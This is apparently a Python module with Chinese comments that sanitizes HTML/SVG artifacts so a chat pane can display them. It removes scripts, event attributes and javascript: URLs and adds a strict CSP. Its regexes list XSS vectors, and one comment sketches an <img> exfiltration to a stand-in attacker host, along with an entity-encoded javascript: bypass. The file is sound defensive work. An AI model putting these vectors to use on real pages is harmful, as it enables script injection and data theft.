"""可交互产物(Gen UI,v0.9.177)的**净化**这一半。

**要解决的问题**:学长写了一份 `.html` / `.svg`(图表、复盘页、给同学看的对比表),
以前只能在文件管理器里看见文件名,要点开才长得像东西。这一格让它**在聊天里就地显形**。

**为什么这一半是"删"而不是"框"**:界面那侧会用
`<iframe sandbox="">` 装这份东西 —— 那个档位下**浏览器本身就不执行脚本、不许可同源、
不许可顶栏跳转**,所以理论上不必再净化。但只靠它有两个洞:①`srcdoc` 的解析在旧内核 /
WebView2 的某些档位上不完全一致,②"没有回写通道"这件事不该只由一个 HTML 属性保证
(这个仓库的规矩是**同一件事两处都立闸**,与 `_upd_public` 那道"绝对路径不外流"同理)。
所以这里先删一遍,界面再沙一次。

删的清单(每一条都要**如实报数**,不许静默删):
- `<script>` 整段连正文;
- `<iframe|frame|object|embed|link|base|form>` 整段的**开标签**(这些元素的危害来自
  元素本身,不是内容,拆了标签就废了);
- `<meta http-equiv="refresh">`;
- 任何 `on*=` 事件属性(SVG 的 XSS 主流向量就是 `onload=`);
- `href/src` 里的 `javascript:` / `vbscript:` / `data:text/html`(先解 HTML 实体再判,
  否则 `&#106;avascript:` 会骗过字面比较)。

**它不是"安全渲染器"的四条边界**(写清楚免得被当成缺陷):
- 不判 CSS 里的东西(`url()` 外联、`@import` 会照原样留着)—— 沙箱里外联图片仍然
  出网,要断网请看界面那条 `update_check` 同级的口径,不在这一格。
- 不改写正文文本:它删的是**结构与属性**,不是"这段写得不好"。
- 只处理文本形态的 html/svg:`.exe`、二进制、超过上限的一律**拒**,而不是截断了装像完整。
- 路径只在工作区里解析(与 `get_asset` 同一条 `_within` 口径),不给绝对路径开门。
"""
from __future__ import annotations

import html as _html
import re

PANEL_MAX_BYTES = 512 * 1024      # 超过就不渲染:一张 1 MB 的表在聊天里没人看得完
PANEL_EXTS = (".html", ".htm", ".svg")

# 会被整段拆掉开标签的元素:危害来自元素本身(能引外部脚本、能发请求、能改基址)
_RISKY_TAGS = ("iframe", "frame", "object", "embed", "link", "base", "form")

_SCRIPT_BLOCK = re.compile(r"<script\b[^>]*>.*?</script>\s*",
                           re.IGNORECASE | re.DOTALL)
# 上头那条要求**闭合标签**;这种"没有结尾的 <script>"单独拆掉开标签,
# 否则把闭合那份去掉后,剩下的半截会把后面所有正文都当成脚本文本吞进去显示不出来。
_SCRIPT_OPEN = re.compile(r"<script\b[^>]*/?>(?:</script>)?", re.IGNORECASE)
_SCRIPT_SELF = re.compile(r"<script\b[^>]*/>", re.IGNORECASE)
_RISKY_OPEN = re.compile(r"</?\s*(?:%s)\b[^>]*>" % "|".join(_RISKY_TAGS),
                         re.IGNORECASE)
_META_REFRESH = re.compile(
    r"<meta\b[^>]*http-equiv\s*=\s*[\"']?\s*refresh\b[^>]*>", re.IGNORECASE)
# on* 属性:值可以是双引号、单引号或裸字(HTML 允许),三种都要吃到
_ON_ATTR = re.compile(
    r"""\son[a-z0-9_.:-]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)""", re.IGNORECASE)
# 会带 URL 的属性:三种引号形状都要吃到**整个值**,再判它是不是可执行 scheme ——
# 只匹配"到冒号为止"会留下后半截(而且 `data:text/html;base64,…` 那种根本没有第二个
# 冒号,按"scheme:"去配就漏掉了)。值先解一层 HTML 实体再判:浏览器就是先解再判的。
_URL_ATTR = re.compile(
    r"""(\s(?:href|src|xlink:href|action|formaction|background|data|to)\s*=\s*)"""
    r"""(?:"([^"]*)"|'([^']*)'|([^\s"\'>]+))""", re.IGNORECASE)
_ENTITY_PREFIX = re.compile(r"^(?:\s|&(?:#\w+|\w+);)*", re.IGNORECASE)
_BAD_SCHEME = re.compile(
    r"^(?:javascript|vbscript|livescript)\s*:|^data:\s*text/html", re.IGNORECASE)


def looks_like_panel(path: str) -> bool:
    """这个路径值不值得走这一格(只看扩展名,判定留给 `read_and_sanitize`)。"""
    low = str(path or "").strip().lower()
    return low.endswith(PANEL_EXTS)


def sanitize(text: str) -> "tuple[str, dict]":
    """删掉可执行的结构,回 (干净的正文, 各删了几处)。

    **计数是这一只手存在的理由之一**:调用方要能说"这张表原样能显示,只是我拆了
    两处脚本",而不是"显示不出来不知道为什么"。
    """
    counts = {"script": 0, "tag": 0, "meta_refresh": 0, "on_attr": 0, "scheme": 0}
    if not text:
        return "", counts
    body = text
    # 1. `<script>`:先按"成对"删(连正文一起),再把剩下来的散标签拆掉
    body, n = _SCRIPT_BLOCK.subn("", body)
    counts["script"] += n
    body, n = _SCRIPT_SELF.subn("", body)
    counts["script"] += n
    body, n = _SCRIPT_OPEN.subn("", body)
    counts["script"] += n
    # 2. 危险元素的开/闭标签(闭标签留着无害,但一起拆掉更省事)
    body, n = _RISKY_OPEN.subn("", body)
    counts["tag"] += n
    body, n = _META_REFRESH.subn("", body)
    counts["meta_refresh"] += n
    # 3. 事件属性
    body, n = _ON_ATTR.subn("", body)
    counts["on_attr"] += n
    # 4. 危险 scheme:**先解 HTML 实体再判**(浏览器就是先解再判的,反过来的话
    #    `&#106;avascript:` 会躲过字面比较而照样执行),判中就把整条值换成 "#"
    def _defuse(m: "re.Match") -> str:
        head = m.group(1)
        raw = m.group(2) or m.group(3) or m.group(4) or ""
        decoded = _html.unescape(raw).lstrip().lower()
        if not _BAD_SCHEME.match(decoded):
            return m.group(0)
        counts["scheme"] += 1
        return head + '"#"'
    body = _URL_ATTR.sub(_defuse, body)
    return body, counts


def stripped_note(counts: dict) -> str:
    """把计数说成一句人话;什么都没删就回空串(别为一件不存在的事道歉)。"""
    hit = [k for k, v in counts.items() if v]
    if not hit:
        return ""
    label = {"script": "脚本", "tag": "外部结构标签", "meta_refresh": "自动跳转",
             "on_attr": "事件属性", "scheme": "可执行链接"}
    return "就地显示前拆掉了:" + "、".join(
        f"{label[k]} {counts[k]} 处" for k in hit) + "(这份是工具写下的文本,不当代码执行)"


def read_and_sanitize(raw: bytes) -> "tuple[str, dict, str]":
    """字节 → (干净正文, 删了什么, 实话)。超限 / 解不开一律拒,不截断了装像完整。"""
    if len(raw) > PANEL_MAX_BYTES:
        return "", {}, (f"这份有 {len(raw) / 1024:.0f} KB,超过就地显示的上限 "
                        f"{PANEL_MAX_BYTES // 1024} KB —— 请在文件里打开看")
    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError:
        try:
            text = raw.decode("gbk")
        except UnicodeDecodeError:
            return "", {}, "这不是 UTF-8/GBK 文本,不按网页渲染"
    body, counts = sanitize(text)
    return body, counts, ""


# 就地显示时**由我们**注入的那一条 CSP。它和界面的 `<iframe sandbox>` 是两道独立
# 的闸(沙箱断"脚本能不能跑、能不能攀回宿主",这条断"能不能往外要东西"),
# 少了它有一份 html 就能用 `<img src="http://_attacker/…#<正文>">` 或 `@import`
# 把本机文件的内容与局域网探到外网去 —— 本地优先的立场不允许这一步出网。
# `style-src 'unsafe-inline'` 是**故意留的**:表要好看就得靠内联样式,而样式本身
# 在这个档位下执行不了代码。
CSP_META = ('<meta http-equiv="Content-Security-Policy" content="'
            "default-src 'none'; style-src 'unsafe-inline'; "
            "img-src data: blob:; font-src data:; media-src 'none'; "
            "form-action 'none'; frame-src 'none'; object-src 'none'"
            '">')


def wrap_document(body: str, kind: str) -> str:
    """把净化过的正文装进一份**带 CSP 的**独立文档。

    SVG 单独一份文件时 `<meta http-equiv>` 是不生效的(SVG 没有 HTML 那个头部语义),
    所以两种都套 HTML 壳 —— 顺带把"整页黑底/无边距"这类观感问题也统一了。
    """
    head = CSP_META + '<meta charset="utf-8">'
    if kind == "svg":
        return ("<!doctype html><html><head>" + head
                + "<style>html,body{margin:0;padding:0;background:transparent;"
                  "color-scheme:light dark}svg{display:block;max-width:100%}</style>"
                "</head><body>" + body + "</body></html>")
    # 正文自己已经带了 <!doctype>/<head> 也不再拆它:CSP 排在**最前面**,
    # 浏览器只认第一份 doctype,后面那份会被忽略而不会顶掉我们这条。
    return head + body
